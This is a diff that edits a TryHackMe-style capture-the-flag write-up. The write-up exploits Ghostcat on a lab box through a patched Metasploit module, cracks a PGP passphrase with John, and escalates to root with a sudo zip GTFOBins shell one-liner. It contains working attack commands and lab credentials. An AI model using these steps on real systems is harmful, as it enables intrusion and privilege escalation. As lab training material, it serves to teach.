@@ -9,41 +9,40 @@ TCP port 8009 is open and running the Apache JServ Protocol (AJP) 1.3, while por
 <span style="line-height:0.5;">&nbsp;</span>
 
 ### Get credentials
-Exploit run a Metasploit module or code that depends on the Metasploit Framework, so we have to run it in Metasploit. Before moving file to directory I had to make some fixes to work. 
+The exploit runs a Metasploit module or code that depends on the Metasploit Framework, so it must be executed within Metasploit. Before moving the file to the correct directory, I had to make a few modifications to get it working. 
 
-Copy code to new file, for exmaple `exploit.rb`. After that create new directory for custom module:
+Copy code to a new file and create the directory for the custom module:
 ```BASH
 mkdir -p ~/.msf4/modules/exploits/multi/http
 ```
-Move  `exploit.rb` to new directory:
+Move  `exploit.rb` into the directory:
 ```BASH
 mv exploit.rb ~/.msf4/modules/exploits/multi/http/ghostcat.rb
 ```
-Run msfconsole
+Run msfconsole:
 ```BASH
 msfconsole
 ```
-Reload all scripts
+Reload all modules:
 ```BASH
 reload_all
 ```
-Use custom module from exploit db
+Use the custom module:
 ```BASH
 use exploit/multi/http/ghostcat
 ```
-Set parameters and run
+Set the parameters and run the exploit:
 ```BASH
 set RHOSTS 10.10.149.201
 set RPORT 8009
 set FILENAME /WEB-INF/web.xml
 run
 ```
+![image](https://github.com/user-attachments/assets/ed1c8cf8-ae01-4e7a-af22-9cce1496c9cf)  
 
-That means the exploit successfully read the file from the remote Tomcat server via the AJP port:
-![image](https://github.com/user-attachments/assets/ed1c8cf8-ae01-4e7a-af22-9cce1496c9cf)
+This indicates the exploit successfully read the file from the remote Tomcat server via the AJP port. However, the script doesn't print the actual response body. Go back to the script's directory and make the following change:  
 
-This exploit successfully makes the AJP request, but it does not print the actual response body. Go back to directory where script sits and make few changes:
-Replace this:
+Replace:
 ```RUBY
 print "#{buf[idx..(idx+len)]}"
 ```
@@ -53,18 +52,25 @@ content = buf[idx...(idx+len)]
 print_status("File contents:\n")
 print_line(content)
 ```
-![image](https://github.com/user-attachments/assets/8bfb432d-af72-4b74-8bb0-4b29f97ef7f2)
-Server responded with:
+
+<span style="line-height:0.5;">&nbsp;</span>
+
+### Fix Internal Server Error
+![image](https://github.com/user-attachments/assets/8bfb432d-af72-4b74-8bb0-4b29f97ef7f2)  
+
+If the server responds with:
 ```BASH
 500 Internal Server Error
 Message: The requested resource [index] is not available
 ```
-This error comes from this line in custom module.
+
+It's due to this line in the script:
 ```RUBY
 {"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
 ```
-Go back to directory where script sits and make some more changes:
-Replace this:
+
+Go back to the directory where custom module is located and make more changes:
+Replace:
 ```RUBY
 attributes = [
     {"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
@@ -72,7 +78,7 @@ attributes = [
     {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
 ]
 ```
-With this:
+With:
 ```RUBY
 attributes = [
     {"req_attribute" => ["javax.servlet.include.request_uri", "/"]},
@@ -81,7 +87,7 @@ attributes = [
 ]
 ```
 
-Go back to msfconsole. Set parameters and run
+Go back to msfconsole, set parameters again, and rerun:
 ```BASH
 set RHOSTS 10.10.149.201
 set RPORT 8009
@@ -96,23 +102,25 @@ From the response you can see that credentials are `skyfuck:8730281lkjlkjdqlksal
 <span style="line-height:0.5;">&nbsp;</span>
 
 ### Log in to the skyfuck account
-SSH to skyfuck account.
+Use SSH:
 ```BASH
 ssh skyfuck@10.10.149.201
 ```
 ![image](https://github.com/user-attachments/assets/b3d3f0ca-4b05-4925-bd46-1ca9a8458e55)
 
-In skyfuck account there are two weird files: `credential.pgp` and `tryhackme.asc`
-These are PGP encrypted files, which likely contain the user flag.  
+Inside the account, there are two suspicious files: `credential.pgp` and `tryhackme.asc`. These are likely PGP-encrypted and may contain the flag or credentials.   
 
 ![image](https://github.com/user-attachments/assets/d6526c3c-a1d9-4e02-bd78-0801d744d2e3)
 
-Run python http server on vicitim machine.
+<span style="line-height:0.5;">&nbsp;</span>
+
+### Download encrypted files to your attack machine
+Start a Python HTTP server on the victim machine:
 ```BASH
 python3 -m http.server 8000
 ```
 
-Download files on attack machine.
+On your attack box:
 ```BASH
 wget http://10.10.149.201:8000/credential.pgp
 wget http://10.10.149.201:8000/tryhackme.asc
@@ -121,31 +129,33 @@ wget http://10.10.149.201:8000/tryhackme.asc
 
 <span style="line-height:0.5;">&nbsp;</span>
 
-### Crack the PGP key passphrase with John the Ripper.
-Run gpg2john on the exported key.
+### Crack the PGP key passphrase with John the Ripper
+Run gpg2john on the exported key:
 ```BASH
 gpg2john secret.asc > pgp.hash
 ```
-Run John on the hash.
+Run John on the hash:
 ```BASH
 john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
 ```
 ![image](https://github.com/user-attachments/assets/a3fe8843-6791-4c58-a713-98f8c63ace80)
 
-The passphrase is `alexandru`. That is the passphrase protecting the tryhackme.asc, which is used to decrypt the file credential.pgp. Decrypt credential.pgp.
+The passphrase is `alexandru`. That is the passphrase protecting the tryhackme.asc, which is used to decrypt the file credential.pgp. Import the key and decrypt the file:
 ```BASH
 gpg --import tryhackme.asc
 gpg --decrypt credential.pgp
 ```
 ![image](https://github.com/user-attachments/assets/74e4d93c-a1ab-420b-91b0-a1c9db65f53a)
-There are credentials to new user: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
+This reveals new credentials: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
+
+<span style="line-height:0.5;">&nbsp;</span>
 
 ### Log in to the merlin account
-Go back to terminal with skyfuck account logged in. Login as merlin.
+Switch user:
 ```BASH
 su merlin
 ```
-Go to merlin's home directory.
+Go to home directory.
 ```BASH
 cd /home/merlin
 ```
@@ -162,17 +172,20 @@ Run this command to check what merlin is allowed to run as root or with elevated
 sudo -l
 ```
 
-![image](https://github.com/user-attachments/assets/fd072d8d-0b6a-416f-8017-843643002cfe)
-You can run /usr/bin/zip as root without password. To escalate privileges using zip go to GTFOBins and search zip. Go to 'Sudo' section and if you can run zip as root via sudo, spawn a root shell by running:
+![image](https://github.com/user-attachments/assets/fd072d8d-0b6a-416f-8017-843643002cfe)  
+
+Merlin can run /usr/bin/zip as root without password. To escalate privileges using zip go to [GTFOBins](https://gtfobins.github.io/) and search zip. Go to 'Sudo' section and if you can run zip as root via sudo, spawn a root shell by running:
 ```BASH
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF
 ```
-After that read root flag.
+
+Read root flag.
 ```BASH
 cat /root/root.txt
 ```
+
 ![image](https://github.com/user-attachments/assets/c9d1a816-d330-41a0-bab0-196ec2525ba3)
 
 root.txt flag:
